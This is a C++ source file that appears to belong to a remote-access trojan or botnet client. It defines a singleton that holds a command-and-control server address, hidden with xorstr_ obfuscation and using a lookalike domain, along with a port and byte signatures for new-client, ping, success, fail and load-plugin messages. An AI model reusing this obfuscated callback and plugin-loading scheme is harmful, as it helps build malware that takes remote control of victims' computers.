#include "Variable.h"

Variable *Variable::Instance = nullptr;

Variable::Variable() { strcpy_s(this->ServerAddress, xorstr_("kyochonchlcken.com")); }

Variable *Variable::getInstance() {
  if (Instance == NULL) {
    Instance = new Variable();
  }

  return Instance;
}

bool Variable::compareSignature(Variable::Signature sig, char *Payload) {
  switch (sig) {
  case Signature::NEW_CLIENT:
    return compareByte(Payload, NewClientSignature);
  case Signature::PING:
    return compareByte(Payload, PingSignature);
  case Signature::RESPONSE_SUCCESS:
    return compareByte(Payload, SuccessSignature);
  case Signature::RESPONSE_FAIL:
    return compareByte(Payload, FailSignature);
  case Signature::LOAD_PLUGIN:
    return compareByte(Payload, LoadPluginSignature);
  default:
    return false;
  }
}

Variable::Signature Variable::findSignature(char *Payload) {
  if (compareByte(Payload, NewClientSignature)) {
    return Signature::NEW_CLIENT;
  } else if (compareByte(Payload, PingSignature)) {
    return Signature::PING;
  } else if (compareByte(Payload, SuccessSignature)) {
    return Signature::RESPONSE_SUCCESS;
  } else if (compareByte(Payload, FailSignature)) {
    return Signature::RESPONSE_FAIL;
  } else if (compareByte(Payload, LoadPluginSignature)) {
    return Signature::LOAD_PLUGIN;
  } else {
    return Signature::NONE;
  }
}

void Variable::allocateSignature(Variable::Signature sig, char *Payload) {
  switch (sig) {
  case Signature::NEW_CLIENT:
    memcpy(Payload, NewClientSignature, 4);
    break;
  case Signature::PING:
    memcpy(Payload, PingSignature, 4);
    break;
  case Signature::RESPONSE_SUCCESS:
    memcpy(Payload, SuccessSignature, 4);
    break;
  case Signature::RESPONSE_FAIL:
    memcpy(Payload, FailSignature, 4);
    break;
  case Signature::LOAD_PLUGIN:
    memcpy(Payload, LoadPluginSignature, 4);
    break;
  }
}

char *Variable::getServerAddress() { return ServerAddress; }

int Variable::getPort() { return Port; }

char *Variable::getSplitter() { return SplitterSignature; }
